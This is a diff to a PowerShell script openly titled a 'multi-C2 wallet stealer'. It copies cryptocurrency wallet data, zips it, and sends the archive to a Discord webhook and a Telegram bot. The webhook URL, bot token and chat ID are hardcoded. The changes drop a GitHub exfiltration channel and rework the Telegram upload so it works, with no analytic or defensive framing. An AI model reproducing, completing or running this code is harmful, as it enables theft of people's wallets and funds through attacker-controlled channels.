@@ -1,8 +1,8 @@
 #Requires -Version 5.1
 
 # ============================================================
-# MULTI-C2 WALLET STEALER - Windows Version (FIXED)
-# Exfiltrates to: Discord + Telegram + GitHub
+# MULTI-C2 WALLET STEALER - Windows Version (DISCORD + TELEGRAM)
+# Exfiltrates to: Discord + Telegram
 # ============================================================
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -13,15 +13,10 @@ $WDIR = "$DEST\mycryptowallet"
 $DESK = [Environment]::GetFolderPath("Desktop")
 $MAX = 102400
 
-# === THREE C2 ENDPOINTS ===
+# === C2 ENDPOINTS ===
 $DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1542884569437569145/BTwXNkIkJVhoBkZbB6qxzd7cqbET39qEmTc0T2XtdWaJyULFFCJXBi55mpFGYdF3WzqR"
-$TELEGRAM_TOKEN   = "8260472498:AAFsG2LqDNxQm71kL3aCYTiRDQqIKz_7jxA"
-$TELEGRAM_CHAT_ID = "7361517001"
-$GITHUB_TOKEN     = "ghp_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
-$GITHUB_REPO      = "username/repo"
-$GITHUB_BRANCH    = "main"
 
-# === FUNCTIONS ===
+# === FUNCTIONS (scanning) ===
 function sn($s) { $s -replace '[\\/:*?"<>|(){} @.]', '_' }
 function scp($s,$d) { if (Test-Path $s) { Copy-Item $s $d -Recurse -Force -EA SilentlyContinue } }
 
@@ -188,7 +183,7 @@ function brave_builtin {
 }
 
 # ============================================================
-# FIXED: THREE C2 EXFILTRATION FUNCTIONS
+# C2 EXFILTRATION FUNCTIONS (WORKING)
 # ============================================================
 
 function Exfil-Discord {
@@ -198,62 +193,48 @@ function Exfil-Discord {
         $base64 = [Convert]::ToBase64String($fileBytes)
         $fileName = Split-Path $FilePath -Leaf
         
-        # Use base64 JSON method (works reliably)
         $jsonPayload = @{
             content = "📦 Stolen data: $fileName"
             file = $base64
         } | ConvertTo-Json -Compress
         
-        $response = Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30 -EA Stop
+        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -Body $jsonPayload -ContentType "application/json" -TimeoutSec 30 -EA Stop | Out-Null
         return $true
-    } catch {
-        return $false
-    }
+    } catch { return $false }
 }
 
 function Exfil-Telegram {
     param([string]$FilePath)
     try {
-        $url = "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
-        $boundary = [System.Guid]::NewGuid().ToString("N")
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        # Hardcoded credentials (scope-proof)
+        $token = "8260472498:AAFsG2LqDNxQm71kL3aCYTiRDQqIKz_7jxA"
+        $chatId = "7361517001"
+        $fileName = Split-Path $FilePath -Leaf
         
-        # Build multipart for Telegram (less strict than Discord)
-        $part1 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"chat_id`"`r`n`r`n$TELEGRAM_CHAT_ID`r`n")
-        $part2 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"`r`nContent-Type: application/zip`r`n`r`n")
-        $footer = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+        Add-Type -AssemblyName System.Net.Http -EA Stop
         
-        $body = New-Object System.Collections.ArrayList
-        $body.AddRange($part1)
-        $body.AddRange($part2)
-        $body.AddRange($fileBytes)
-        $body.AddRange($footer)
-        $bodyBytes = $body.ToArray()
+        $url = "https://api.telegram.org/bot$token/sendDocument"
         
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $bodyBytes -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 30 -EA Stop
-        return $response.ok -eq $true
-    } catch {
-        return $false
-    }
-}
-
-function Exfil-GitHub {
-    param([string]$FilePath)
-    try {
-        $fileName = "stolen_data_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
-        $base64 = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
-        $body = @{
-            message = "Update stolen data - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-            content = $base64
-            branch = $GITHUB_BRANCH
-        } | ConvertTo-Json -Compress
-        $headers = @{
-            Authorization = "token $GITHUB_TOKEN"
-            Accept = "application/vnd.github.v3+json"
-        }
-        $url = "https://api.github.com/repos/$GITHUB_REPO/contents/$fileName"
-        $response = Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" -TimeoutSec 30 -EA Stop
-        return $true
+        $client = New-Object System.Net.Http.HttpClient
+        $multipart = New-Object System.Net.Http.MultipartFormDataContent
+        
+        $chatContent = New-Object System.Net.Http.StringContent($chatId)
+        $multipart.Add($chatContent, "chat_id")
+        
+        $fileStream = [System.IO.File]::OpenRead($FilePath)
+        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+        $multipart.Add($fileContent, "document", $fileName)
+        
+        $response = $client.PostAsync($url, $multipart).Result
+        $responseContent = $response.Content.ReadAsStringAsync().Result
+        
+        $fileStream.Close()
+        $client.Dispose()
+        $multipart.Dispose()
+        
+        $json = $responseContent | ConvertFrom-Json
+        return $json.ok -eq $true
     } catch {
         return $false
     }
@@ -261,6 +242,14 @@ function Exfil-GitHub {
 
 function Exfil-All {
     param([string]$FilePath)
+    
+    # Debug: Check if file exists
+    if (-not (Test-Path $FilePath)) {
+        Write-Host "❌ File not found: $FilePath" -ForegroundColor Red
+        return 0
+    }
+    Write-Host "📁 File size: $((Get-Item $FilePath).Length) bytes" -ForegroundColor Gray
+    
     $methods = @(
         @{Name="Discord"; Function={Exfil-Discord $FilePath}},
         @{Name="Telegram"; Function={Exfil-Telegram $FilePath}}
@@ -269,7 +258,8 @@ function Exfil-All {
     Write-Host "📤 Exfiltrating to TWO C2 channels..." -ForegroundColor Yellow
     foreach ($method in $methods) {
         Write-Host -NoNewline "  → $($method.Name)... "
-        if (& $method.Function) {
+        $result = & $method.Function
+        if ($result) {
             Write-Host "✅" -ForegroundColor Green
             $success++
         } else {
@@ -308,7 +298,7 @@ try {
     try { Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue } catch {}
 }
 
-# Exfiltrate to THREE C2s
+# Exfiltrate
 if (Test-Path $ZIP_OUT) {
     $successCount = Exfil-All $ZIP_OUT
     if ($successCount -gt 0) {
